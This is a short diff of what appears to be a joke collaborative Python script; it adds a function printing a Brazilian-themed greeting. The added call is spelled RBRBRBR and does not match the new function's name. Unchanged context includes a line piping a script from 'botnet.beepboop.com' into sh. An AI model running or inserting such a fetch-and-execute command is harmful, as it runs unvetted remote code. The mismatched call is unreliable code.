@@ -1108,7 +1108,9 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-
+        
+def BRBRBRBR():
+    print 'Hi from BRAZIL! REMEMBER BRBRBRBRBRBR HUEHUEHUE!'
 
 def ngokevin(shamelessadvertising):
     # I'm sleepy zzz.
@@ -1808,6 +1810,7 @@ if __name__ == "__main__":
     sricola()
     kisom()
     rixx()
+    RBRBRBR()
     ncammarata()
     eddotman()
     myusuf3()
